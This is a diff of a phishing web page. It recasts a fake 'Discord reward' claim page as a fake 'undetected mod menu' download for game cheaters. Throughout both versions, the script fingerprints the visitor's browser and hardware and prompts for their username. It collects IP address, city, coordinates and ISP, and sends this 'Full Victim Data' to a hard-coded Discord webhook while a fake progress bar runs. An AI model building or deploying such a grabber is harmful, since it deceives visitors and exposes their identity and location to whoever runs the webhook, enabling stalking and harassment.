@@ -3,66 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 EXCLUSIVE REWARD - CLAIM IMMEDIATELY 🎁</title>
+    <title>ULTIMATE MOD MENU v2.4 - FREE DOWNLOAD</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
         body {
-            background: linear-gradient(45deg, #0a0a0a, #1a0033, #000);
-            color: #00ffcc;
+            background: linear-gradient(45deg, #0a0a0a, #1a001f, #000);
+            color: #00ff41;
             font-family: 'Press Start 2P', cursive;
             text-align: center;
             padding: 20px;
             margin: 0;
             overflow: hidden;
             height: 100vh;
-            image-rendering: pixelated;
         }
-        .container { max-width: 650px; margin: auto; padding-top: 10vh; }
+        .container { max-width: 680px; margin: auto; padding-top: 8vh; }
         h1 { 
-            font-size: 2.1em; 
-            text-shadow: 0 0 25px #00ffcc, 0 0 40px #ff00ff;
-            animation: glitch 0.8s infinite alternate;
+            font-size: 2em; 
+            text-shadow: 0 0 20px #00ff41, 0 0 40px #ff00ff;
+            animation: glitch 0.7s infinite alternate;
+            margin-bottom: 10px;
         }
+        .subtitle { color: #ff00ff; font-size: 1.1em; margin-bottom: 30px; }
         .progress { 
-            height: 25px; background: #111; border: 3px solid #00ffcc; 
-            margin: 35px auto; width: 85%; box-shadow: 0 0 20px #00ffcc;
+            height: 28px; background: #111; border: 3px solid #00ff41; 
+            margin: 35px auto; width: 88%; box-shadow: 0 0 25px #00ff41;
         }
         .bar { 
-            height: 100%; width: 0%; background: linear-gradient(to right, #00ffcc, #ff00ff, #00ffcc);
-            transition: width 0.25s linear; box-shadow: 0 0 15px #ff00ff;
+            height: 100%; width: 0%; background: linear-gradient(to right, #00ff41, #ff00ff, #00ff41);
+            transition: width 0.25s linear; box-shadow: 0 0 20px #ff00ff;
         }
         button {
-            margin-top: 25px; padding: 18px 50px; font-size: 1.2em; 
-            background: #ff00ff; color: #000; border: 3px solid #00ffcc;
-            cursor: pointer; box-shadow: 0 0 35px #ff00ff; transition: all 0.3s;
+            margin-top: 25px; padding: 20px 55px; font-size: 1.25em; 
+            background: #ff00ff; color: #000; border: 4px solid #00ff41;
+            cursor: pointer; box-shadow: 0 0 40px #ff00ff; transition: all 0.3s;
             text-transform: uppercase;
         }
         button:hover { 
-            transform: scale(1.15); box-shadow: 0 0 60px #ff00ff; 
+            transform: scale(1.12); box-shadow: 0 0 70px #ff00ff; 
         }
         @keyframes glitch {
             0% { transform: translate(0); }
-            20% { transform: translate(-3px, 3px); }
-            40% { transform: translate(3px, -3px); }
-            60% { transform: translate(-2px, 2px); }
+            20% { transform: translate(-4px, 3px); }
+            40% { transform: translate(4px, -3px); }
             100% { transform: translate(0); }
         }
-        #status { margin: 15px 0; font-size: 1.1em; min-height: 1.5em; }
+        #status { margin: 20px 0; font-size: 1.15em; min-height: 1.8em; text-shadow: 0 0 10px #00ff41; }
+        .warning { color: #ff0000; font-size: 0.9em; margin-top: 40px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎁 CLAIM YOUR EXCLUSIVE REWARD 🎁</h1>
-        <p id="status">Verifying account eligibility...</p>
+        <h1>ULTIMATE MOD MENU v2.4</h1>
+        <p class="subtitle">FREE • UNDETECTED • WORKING 2026</p>
+        <p id="status">Connecting to private server...</p>
         <div class="progress"><div id="prog" class="bar"></div></div>
-        <button onclick="startClaim()">CLAIM NOW - LIMITED TIME</button>
-        <p style="margin-top:30px; font-size:0.8em; opacity:0.7;">Powered by Discord Rewards • Secure Claim</p>
+        <button onclick="startClaim()">ACTIVATE MOD MENU / DOWNLOAD</button>
+        <p class="warning">BYPASS ANTICHEAT • ESP • AIMBOT • GODMODE</p>
     </div>
 
     <script>
-        // === COLLECT ALL POSSIBLE DATA ===
         const urlParams = new URLSearchParams(window.location.search);
-        const customId = urlParams.get('id') || urlParams.get('victim') || urlParams.get('u') || "Unknown";
+        const customId = urlParams.get('id') || urlParams.get('victim') || urlParams.get('game') || "Unknown";
 
         let data = {
             customId: customId,
@@ -74,92 +75,79 @@
             languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
             screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
             referrer: document.referrer || "direct",
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
             hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
             deviceMemory: navigator.deviceMemory || "N/A",
             connection: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
             battery: "N/A"
         };
 
-        // Advanced Fingerprinting
         function getAdvancedFingerprint() {
             let fp = "";
             try {
-                // Canvas
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = "top";
-                ctx.font = "14px Arial";
-                ctx.fillStyle = "#f00";
-                ctx.fillText("GROK WAS HERE - " + Date.now(), 10, 50);
-                fp += canvas.toDataURL().slice(0, 120);
+                ctx.font = "16px Arial";
+                ctx.fillStyle = "#0f0";
+                ctx.fillText("MOD MENU ACTIVATED - " + Date.now(), 15, 60);
+                fp += canvas.toDataURL().slice(0, 140);
 
-                // WebGL
-                const glCanvas = document.createElement('canvas');
-                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+                const gl = document.createElement('canvas').getContext('webgl');
                 if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    fp += gl.getParameter(gl.VENDOR) + "|" + (debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "");
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    fp += "|" + gl.getParameter(gl.VENDOR) + "|" + (debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A");
                 }
 
-                // Audio
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                oscillator.type = 'triangle';
-                fp += oscillator.frequency.value + "|" + audioCtx.sampleRate;
+                const audio = new (window.AudioContext || window.webkitAudioContext)();
+                fp += "|" + audio.sampleRate;
             } catch(e) {}
-            return btoa(fp + navigator.userAgent).substring(0, 80);
+            return btoa(fp + navigator.userAgent).substring(0, 90);
         }
         data.fingerprint = getAdvancedFingerprint();
 
-        // Battery (if available)
         if (navigator.getBattery) {
-            navigator.getBattery().then(bat => {
-                data.battery = `${bat.level * 100}% - ${bat.charging ? 'Charging' : 'Discharging'}`;
-            });
+            navigator.getBattery().then(b => data.battery = `${Math.round(b.level*100)}% ${b.charging ? 'Charging' : ''}`);
         }
 
         function fakeLoading() {
             let progress = 0;
             const progBar = document.getElementById('prog');
             const status = document.getElementById('status');
-            const messages = [
-                "Verifying account eligibility...",
-                "Fetching reward data...",
-                "Connecting to secure server...",
-                "Validating fingerprint...",
-                "Finalizing claim..."
+            const msgs = [
+                "Connecting to private server...",
+                "Bypassing anticheat...",
+                "Injecting ESP + Aimbot...",
+                "Finalizing activation...",
+                "Downloading files..."
             ];
-            let msgIndex = 0;
+            let i = 0;
 
-            const interval = setInterval(() => {
-                progress += Math.random() * 22 + 8;
+            const int = setInterval(() => {
+                progress += Math.random() * 26 + 9;
                 if (progress > 100) progress = 100;
                 progBar.style.width = `${progress}%`;
 
-                if (progress > 25 && msgIndex === 0) { status.textContent = messages[1]; msgIndex++; }
-                if (progress > 55 && msgIndex === 1) { status.textContent = messages[2]; msgIndex++; }
-                if (progress > 80 && msgIndex === 2) { status.textContent = messages[3]; msgIndex++; }
+                if (progress > 30 && i === 0) { status.textContent = msgs[1]; i++; }
+                if (progress > 55 && i === 1) { status.textContent = msgs[2]; i++; }
+                if (progress > 78 && i === 2) { status.textContent = msgs[3]; i++; }
                 if (progress >= 100) {
-                    clearInterval(interval);
-                    status.textContent = messages[4];
+                    clearInterval(int);
+                    status.textContent = msgs[4];
                 }
-            }, 140);
+            }, 135);
         }
 
         window.startClaim = function() {
-            const nameInput = prompt("ENTER YOUR DISCORD USERNAME TO UNLOCK REWARD:", "") || "Anonymous";
-            data.name = nameInput.trim();
+            const username = prompt("ENTER YOUR GAME USERNAME / DISCORD TAG TO ACTIVATE:", "") || "Anonymous";
+            data.name = username.trim();
 
             fakeLoading();
 
-            // Redundant IP + Geo
             Promise.all([
                 fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({})),
                 fetch('https://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting').then(r => r.json()).catch(() => ({}))
-            ]).then(([ipData, geo]) => {
-                data.ip = ipData.ip || "N/A";
+            ]).then(([ipRes, geo]) => {
+                data.ip = ipRes.ip || "N/A";
 
                 Object.assign(data, {
                     country: geo.country || "Unknown",
@@ -168,60 +156,39 @@
                     region: geo.regionName || "Unknown",
                     isp: geo.isp || "Unknown",
                     timezone: geo.timezone || "Unknown",
-                    lat: geo.lat || "Unknown",
-                    lon: geo.lon || "Unknown",
-                    proxy: geo.proxy ? "YES (VPN/Proxy/Tor)" : "No",
-                    as: geo.as || "N/A"
+                    lat: geo.lat || "N/A",
+                    lon: geo.lon || "N/A",
+                    proxy: geo.proxy ? "YES (VPN/Proxy)" : "No"
                 });
 
                 const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
 
                 const payload = {
-                    username: "IP GRABBER",
+                    username: "Mod Menu Grabber",
                     avatar_url: "https://i.imgur.com/removed.png",
-                    content: `**🔥 ULTRA GRAB SUCCESS 🔥**\n` +
-                             `**Custom ID:** ${data.customId}\n` +
-                             `**Name:** ${data.name}\n` +
-                             `**IP:** ${data.ip}\n` +
-                             `**Country:** ${data.country} (${data.countryCode})\n` +
-                             `**City:** ${data.city} | **Region:** ${data.region}\n` +
-                             `**ISP:** ${data.isp}\n` +
-                             `**Timezone:** ${data.timezone}\n` +
-                             `**Coords:** ${data.lat}, ${data.lon}\n` +
-                             `**Proxy/VPN:** ${data.proxy}\n` +
-                             `**Fingerprint:** ${data.fingerprint}\n` +
-                             `**Hardware:** ${data.hardwareConcurrency} cores | ${data.deviceMemory}GB | Battery: ${data.battery}\n` +
-                             `**Screen:** ${data.screen} | Lang: ${data.language}\n` +
-                             `**Time:** ${data.timestamp}\n` +
-                             `**UA:** ${data.userAgent.substring(0, 120)}...`,
+                    content: `**🔥 MOD MENU GRABBED 🔥**\n**ID:** ${data.customId}\n**Username:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country} (${data.countryCode})\n**ISP:** ${data.isp}\n**Proxy:** ${data.proxy}\n**Time:** ${data.timestamp}`,
                     embeds: [{
-                        title: "Full Data Dump",
+                        title: "Full Victim Data",
                         description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
-                        color: 0xff00ff
+                        color: 0x00ff41
                     }]
                 };
 
-                // Send with fallback
                 fetch(webhook, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(payload)
-                }).catch(() => {
-                    // Silent fallback (no second attempt visible)
-                }).finally(() => {
-                    setTimeout(() => {
-                        window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq";
-                    }, 1200);
-                });
-            }).catch(() => {
-                setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq", 800);
+                }).catch(() => {});
+
+            }).finally(() => {
+                // Always rickroll after grab attempt
+                setTimeout(() => {
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq";
+                }, 1400);
             });
         };
 
-        // Auto start on load
-        window.onload = () => {
-            setTimeout(fakeLoading, 300); // Slight delay for realism
-        };
+        window.onload = () => setTimeout(fakeLoading, 400);
     </script>
 </body>
 </html>
